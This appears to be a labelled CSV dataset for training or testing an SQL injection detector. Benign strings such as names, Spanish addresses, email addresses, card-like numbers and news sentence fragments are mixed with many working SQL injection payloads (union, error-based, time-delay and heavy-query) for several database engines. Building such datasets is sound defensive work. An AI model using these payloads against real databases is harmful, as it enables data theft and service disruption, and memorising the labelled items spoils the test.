Sentence,Label
sabadell,0
bendixsen9@foreignoffice.ps,0
koeman0,0
7953912981751706,0
"c/ arago 194,",0
"torres altas, 162",0
grandia zarzosa,0
carminati@granbretana.com.uk,0
3260901599339838,0
1' )  where 6622 = 6622 order by 1--,1
"1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--",1
"1%""  )  )   or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1'  )  )   as plbt where 4368 = 4368 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
"-4319"" )  where 7534 = 7534 or 8246 = 3217",1
"calle japon, 124, 10a",0
"1 )  where 6374 = 6374 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
"1""  )  )   as uzvu where 2458 = 2458 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) --",1
 Investigators also found entries private investigator &apos;s computer Ms Pawlby sister &quot; Projects ,0
humfrey,0
-9893' or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'pbop' = 'pbop,1
solano,0
horcajo de montemayor,0
sabel,0
reyero,0
waitfor delay '0:0:5' and   (  (   ( 'ywnm' = 'ywnm,1
"1"" )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and  ( ""lsca"" like ""lsca",1
" They manhandled , heads held water , tacked wall evening gowns ",0
" select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
"-1303' union all select 4840,4840#",1
1'+ ( select 'jaok' where 2592 = 2592,1
0o380ado6,0
e517a$d7,0
" Miss Hall , Halifax , West Yorkshire , said: &quot; Watching rescue terrifying ",0
soussa,0
jolgorio,0
"1"" union all select null,null,null,null,null,null#",1
-9217 or 9323 = 9323#,1
06131,0
"1' )  union all select null,null#",1
1%' )  and 2006 = 2006,1
1 )  where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
bennasar,0
 That &apos;s something &apos;d ever get America second-year medical student ,0
19260,0
 Physical changes &apos;t mean puberty imminent There &apos;s evidence hormones chemicals blame Experts think obesity epidemic might one trigger early puberty The trend toward early puberty pronounced boys Former CNN correspondent Pat Etheridge journalist specializing children &apos;s health family issues ,0
alejandro,0
2066,0
"-8868"" )  where 5681 = 5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",1
3602043151180886,0
nandor,0
carroar,0
1' )  as mwpp where 6192 = 6192,1
c/ santo domingo 13 10?b,0
c/ bandera 125 8-c,0
torrie,0
"1'  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
2564,0
"1  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 8671 = 8671",1
" Here principle &quot; Pre-Crime &quot; developed , i",0
" An exasperated Sebelius uttered phrase , caught hot mic , aide seated behind yesterday &apos;s House hearing following contentious exchange Rep",0
almaluez,0
"-8557 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
 The specific details confirmed subsequent meetings decided additional joint meeting six committees coming spring ,0
palidwor,0
1 )  where 9649 = 9649 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
1' )  as wjty where 2971 = 2971,1
trela@ajuntamentdebarcelona20.tk,0
cobran,0
41842m67n9c55,0
" Passengers often grumble baggage charges fees , airlines love ",0
1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5  )  )  +',1
faustino cavadas 162 6-a,0
brazzel1@castigadas.am,0
50228,0
ario,0
9690868627126482,0
f8av2,0
06208,0
1 )  where 9821 = 9821 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1
"-9098' union all select 3476,3476,3476,3476,3476,3476#",1
8322438262219801,0
os,1
albertina,0
6402952155575779,0
gracindo@ajuntamentbcn2-0.jp,0
4210,0
-4055'  )  )   as yoez where 3816 = 3816 or  ( 8459 = 8459 ) *4906--,1
"1"" )  where 9570 = 9570 rlike  ( select  ( case when  ( 1642 = 3686 )  then 1 else 0x28 end  )  )  --",1
 What makes things difficult Rockers almost always observe consider complete silence appearing court - say absolutely nothing ,0
1'|| ( select 'ezse' from dual where 3821 = 3821,1
punsly-giskes@botilleria.com.ni,0
1'  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (  'krvo' like 'krvo,1
1 where 8889 = 8889,1
1'  )  )   as wdor where 7426 = 7426,1
"1%""  )  )   union all select null,null,null,null,null--",1
ben2,0
lock,0
"1"" )  as jrse where 9185 = 9185 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
marquet diez,0
2936466219545326,0
7202990502846857,0
tolan.herlie@movil-google.mx,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""%"" = """,1
tamerlani@ubikuo.cc,0
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ",1
adalgisa,0
 Their every truth quite true,0
glyn7,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( 'oskf' like 'oskf",1
36852462e,0
"1"" where 9083 = 9083 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
12395217b,0
1'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'pneh' like 'pneh,1
" select * from users where id = 1 or "" ) 1"" or 1 = 1 -- 1",1
fresia,0
"calle santa escolastica, 184",0
"1"" )  union all select null,null--",1
santaren,0
ronaldso,0
"1'  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( 'gmvk' like 'gmvk",1
27268,0
1872,0
8741178125642533,0
"-2276""  )  )   as qwow where 2321 = 2321 or 3534 = 2971--",1
adlard@muebemiweb.ke,0
ex27mulgar,0
"1'|| ( select 'dukt' where 3206 = 3206 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1
-8999'  )  )   )  or 6872 = 6872 and   (  (   ( 'jare' = 'jare,1
san esteban de litera,0
"1%""  )  )   )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( ""%"" = """,1
"1"" )  as cnrh where 8524 = 8524 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  --",1
select sleep ( 5 )  and   (  (  3404 = 3404,1
"1 )  where 4710 = 4710 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
" Since stood June 2007 decade leader , Mr Blair largely avoided discussing British politics , confining comments foreign affairs role envoy Quartet Middle East peacemakers ",0
33160,0
2olt,0
6m2rtam267t3,0
03580,0
" The mission involves placing detector , consisting two three probes , outer space ",0
37200229y,0
54,0
select sleep ( 5 )  and   (  (  '%' = ',1
calle torreta 126 9c,0
constante,0
"1"" where 5250 = 5250",1
"1' in boolean mode )  union all select null,null,null,null,null,null,null,null,null#",1
8721,0
playado,0
5r32n7,0
desintegrar,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'hvqt' = 'hvqt",1
 I spare effort implement mandate given member states realise vision sustainable development goals build success MDGs ,0
"ingeniero pedro leon, 160, 10-b",0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
86m-bra,0
 This also confirmed Peter Arnold Offenburg District Office ,0
" select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
"1'+ ( select ocvc where 6981 = 6981 union all select null,null,null,null,null,null,null,null,null,null#",1
"1'  )  )   )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (   ( 'fvbv' = 'fvbv",1
cristy,0
marcelo,0
"1'+ ( select zbyt where 4575 = 4575 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  +'",1
31383,0
del ngel kercad,0
"1' where 8950 = 8950 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"1%'  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  '%' = '",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
9492211804246641,0
athony,0
" Except landing arrival aircraft , flight traffic temporarily suspended , reported ",0
"1%' )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and  ( '%' = '",1
sienes,0
demorest,0
noblejas,0
vish,0
gourley,0
12188295c,0
0911357592887177,0
select  ( case when  ( 8993 = 8846 )  then 8993 else 8993* ( select 8993 from mysql.db )  end ) #,1
2425930139286993,0
1342i3,0
 Mick Jagger says never hit Katy Perry 18 ,0
"1%""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""%"" = """,1
"1%"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""%"" = """,1
43869,0
quel,0
select  ( case when  ( 8601 = 1220 )  then 8601 else 8601* ( select 8601 from mysql.db )  end ) #,1
"1%' or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and '%' = '",1
dariela,0
emetrio,0
8339229633184139,0
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( ""avyw"" = ""avyw",1
whorf.laporte@sindualidad.fo,0
sobaquera,0
38068,0
"1%"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""%"" = """,1
tillo,0
sirevici,0
select  ( case when  ( 5142 = 6855 )  then 5142 else 5142* ( select 5142 from mysql.db )  end ) #,1
peramola,0
 She minutes city centre using public transport ,0
" RBS suspends two forex traders Royal Bank Scotland suspended two traders foreign exchange division according two people familiar situation , another sign global probe regulators suspected manipulation currency market rapidly gaining traction ",0
 Kenyan lawmakers target public anger past ,0
"c/ san gines, 180, 3-d",0
5077412783362811,0
"-5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1
02906029w,0
ildefonso,0
1' )  and 7533 = 7533,1
"1%"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
1937545396216025,0
"calle palmito, s/n, 12?g",0
" &quot; Small medium sized companies often lack experience , personnel financial resources protect corporate secrets effectively unauthorised access , &quot; BfV warns report ",0
quint,0
huong,0
"-6478""  )  )   union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1
"1  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  7992 = 7992",1
"1 union all select null,null,null,null,null,null,null,null--",1
31170,0
select case when 6662 = 9889 then 1 else null end--,1
arme!lluela,0
1' )  and 7290 = 8416 and  ( 'ktlz' like 'ktlz,1
valentini funosa,0
2ab130e,0
racette,0
"1' )  where 8835 = 8835 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"c/ los rosales 166, 6f",0
15429251t,0
"1 where 3799 = 3799 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
candelario,0
tipton9,0
lugar canedo s/n 13h,0
vincenzi1@saavedradiaz.tc,0
"calle santa teresa, 87 5?b",0
1 )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( 1073 = 1073,1
"-3461""  )  )   union all select 6342,6342,6342,6342,6342,6342#",1
morek,0
conmi5u52,0
jord,0
1'+ ( select 'qylf' where 6984 = 6984 and 2255 = 5094,1
davids@chuecafamily.gov,0
 &quot; The rep adds: &quot; Perhaps confusing someone else ,0
"1' )  union all select null,null,null,null,null#",1
chutas,0
jed,0
"torrent de can besora, 68",0
"-4047'|| ( select 'rqta' from dual where 9743 = 9743 union all select 9743,9743,9743#",1
15873,0
46174775k,0
bossa,0
select  ( case when  ( 8820 = 4648 )  then 8820 else 8820* ( select 8820 from information_schema.character_sets )  end ) #,1
46837,0
"-8349 )  union all select 8126,8126#",1
domeable,0
"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"iif ( 5214 = 7412,1,1/0 ) ",1
karolefs,0
" According The Star newspaper , new bill effectively hand government &quot; stranglehold media , &quot; The Standard said democracy free speech Kenya &quot; dealt major blow &quot; lambasted bill &quot; draconian ",0
"1  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( 3023 = 3023",1
42127,0
jazmn,0
 ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( 'pfle' like 'pfle,1
1 )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ,1
"1"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1
"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
"calle radio, 89 10f",0
475t38la,0
"1'  )  )   )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (   ( 'wnzv' = 'wnzv",1
7698,0
6622,0
"-2430' )  union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1
1%' )  and 2949 = 4847 and  ( '%' = ',1
"paseo constitucion, 10,",0
7348,0
%7C,1
" And: &quot; In society major crimes , detention camp full would-be criminals &quot; ",0
alcoy/alcoi,0
atractivo,0
5212327174460921,0
"calle torrefina 127, 9-d",0
"passeig desert 180,",0
"1'  )  )   as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1
"-3518 )  union all select 1877,1877,1877,1877#",1
1  )  )   as prxq where 4600 = 4600,1
"do cotaredo, 147 9e",0
"carrer lepant, 128, 11-g",0
35141479d,0
sothern@asesoriaviesca.nc,0
" A report filed European Commission 2011 described intersex people different transsexual transgender people , status gender related instead relates biological makeup , neither exclusively male exclusively female , typical clearly defined either ",0
arndiga,0
reaves-phillips@baybay.tm,0
8336103681905855,0
5695809811217784,0
"1""  )  )   or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""pmmr"" = ""pmmr",1
"-9929' )  as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
urette@elcarritodelacompra.ch,0
agraviamiento,0
32654,0
02314635f,0
mairozio,0
jado,0
othello,0
shoeb,0
731a*n8,0
1 )  and 9198 = 9198--,1
"1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( 'cpoy' = 'cpoy",1
 This include possibility eventual journey times Glasgow Edinburgh London three hours less ,0
uk new2 4 1 * ** *** **** ****** ******* ******** ********* ************* ******************* ********************** subject desc 79 sub0104 9 e_qna eng modify 1 28988 28988 F1 read F1 9636 35 v aWR4PTM0MjQsd1mc3RhcnRQYWdlPTMxNSZsaXN0Tm89MjU5NSZ0YWJsZT1yZWRfYmJzX2RhdGEmY29kZT1xbmEmc2VhcmNoX2l0ZW09JnNlYX123Jja123F9vcmRlcj0 = || Y29kZT1xbmEmc2VhcmNsasdf;lkaspodfkd123oX2l0sdfsdZW09JnNlYXJjaF9vcmRlcj0mdW5zaW5nY29kZTE9MTI1Nzc1NTY5MSZ1bnNpbmdjb2RlMj0xMjU3NzU1N123zczJnVuc2luZ2NvZGUzPSZjYXRlPSZwd2Q9|| e_qna eng 난 짱이다,0
"1""  )  )   as ubrg where 7318 = 7318 and 7331 = 6529--",1
"carrer joan berenguer, 38,",0
8651552740405089,0
1051962151250020,0
"1%"" ) ",1
calle oxigeno 197,0
"1'|| ( select 'tkmc' from dual where 9675 = 9675 union all select null,null,null,null--",1
rojo,0
gimnez toneu,0
08614,0
klaudt,0
farraron,0
flack@asociaciondearquitectoslatinoamericanos.mobi,0
ganoza,0
villasequilla,0
"1""  )  )   )  rlike  ( select  ( case when  ( 6915 = 4531 )  then 1 else 0x28 end  )  )   and   (  (   ( ""jzzu"" = ""jzzu",1
" At forum , Johanna Rahner wants address question people today view &quot; end times &quot; death ",0
"-9462"" )  as vzga where 4799 = 4799 or 8691 = 1048",1
" The power resides new nature, none knows do, know tried",0
"1' and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and 'tqvy' like 'tqvy",1
"1' in boolean mode )  union all select null,null,null,null,null,null#",1
nufrago,0
" &quot; However , merely chronicle Geisingen , rather printed work Geisingen today , consists Geisingen , Kirchen-Hausen , Leipferdingen , Aulfingen Gutmadingen , &quot; said Mayor Walter Hengstler ",0
' or 'something' like 'some%',1
 Valero said popes typically elevated bishops large places position cardinal Francis &quot; full surprises -- &apos;t know &apos;ll name ,0
cardona@interanuncios.mv,0
gallifa,0
bateman@alojesuweb.in,0
1 )  where 1527 = 1527 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
amancio,0
select  ( case when  ( 4306 = 2815 )  then 4306 else 1/ ( select 0 )  end ) --,1
4829100959791841,0
"1""  )  )   )  union all select null,null,null,null,null,null#",1
 The crowning glory visit Abendmahlskirche ,0
colmada43n24,0
1' where 1593 = 1593,1
mariabel,0
pizcar,0
"iif ( 1878 = 2513,1,1/0 ) ",1
bjorn,0
" select * from users where id = 1 + @<@# union select null,version (  )  -- 1",1
 Geisingen Kirchen-Hausen first documented together year 794 ,0
kaneko,0
"1%""  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  ""%"" = """,1
cowart,0
pizorno talarn,0
"1%'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( '%' = '",1
" However , always interested regulatory developments could benefit passengers certainly taking close look FAA &apos;s decision reasons behind ",0
si1ovi3,0
3242091278649247,0
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",1
7875,0
viriato,0
orbegoso,0
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",1
 A member security staff also killed ,0
3959,0
"1 where 4968 = 4968 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) --",1
esc2n3alosa5e4te,0
mnico echeverra,0
calle castaos 90,0
60511130q,0
valdemoro,0
1%' waitfor delay '0:0:5' and '%' = ',1
 The work HS2 Ltd suggests high-speed services Scotland north England start soon Phase One opens 2026 ,0
"1' )  where 3579 = 3579  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
74566884x,0
"1%""  )  )   )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and   (  (   ( ""%"" = """,1
maximinio,0
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and  ( 'fwok' like 'fwok",1
aguacella,0
crabe,0
"cantallops, 138,",0
stetson,0
atora,0
"-3637"" or  ( 8459 = 8459 ) *4906",1
" Burfien puts process secularisation: &quot; God &apos;s voice quiet , world loud &quot; ",0
"1"" )  where 7548 = 7548",1
50004,0
84996241v,0
" However , Damascus still start destroying existing weapons stockpiles ",0
"c/ fernandez shaw, 177 1-e",0
vargueo,0
056cun95v08ac497,0
"1%'  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( '%' = '",1
75,0
1%'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
 We must stay composed keep ,0
m9ncilla57,0
caete,0
tabuyo-cardille@multaspendientes.bf,0
b23a3io,0
catrielcelis,0
" &quot; And , recently , cannot excuse failure design simple website three years since Affordable Care Act signed law ",0
"1'  )  )   union all select null,null,null#",1
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1
stastny,0
culler castanyer,0
"calle olmo seco, 126,",0
bockaj,0
95944263q,0
clarette,0
jeshua,0
"1""  )  )   )  and 2006 = 2006",1
"1 )  where 5096 = 5096 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
 ( select  ( case when  ( 9856 = 9856 )  then sleep ( 5 )  else 9856* ( select 9856 from information_schema.character_sets )  end  )  )  ,1
12018831c,0
0659755476152636,0
"1'|| ( select 'vwop' where 8536 = 8536 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
duffield@telelujo.coop,0
girona,0
coulter,0
"-1065  )  )   union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1
mucheng,0
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'rozr' like 'rozr,1
 Fenton lauded judges natural handling skills well beyond years ,0
nel,0
pedro muoz,0
econmicamente,0
" Thomas Bittner , Liberal Party Parliamentary Group Municipal Association Chairman , supporting fellow group members: &quot; What annoys , fact collection times changed cancelled quiet &quot; ",0
favio_zakin@so-tel.cl,0
" select * from users where id = 1 or "" )  ( "" = 1 or 1 = 1 -- 1",1
1'+ ( select mavu where 4276 = 4276 rlike sleep ( 5 ) #,1
bularros,0
"1'  )  )   )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and   (  (   ( 'yznn' like 'yznn",1
maurilio,0
"-7738%"" )  union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1
%26,1
38623329g,0
harmony,0
"1"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"1%' )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( '%' = '",1
quill,0
 He added: &quot; We &apos;re dealing new world people willing blow ,0
rasmia,0
90,0
dalleto poroma,0
tait@ibizasounds.ir,0
stars,0
"1' or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
sedo kohls,0
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and ""ygzq"" like ""ygzq",1
"1 )  as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) --",1
"1""  )  )   or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  ""oxvw"" = ""oxvw",1
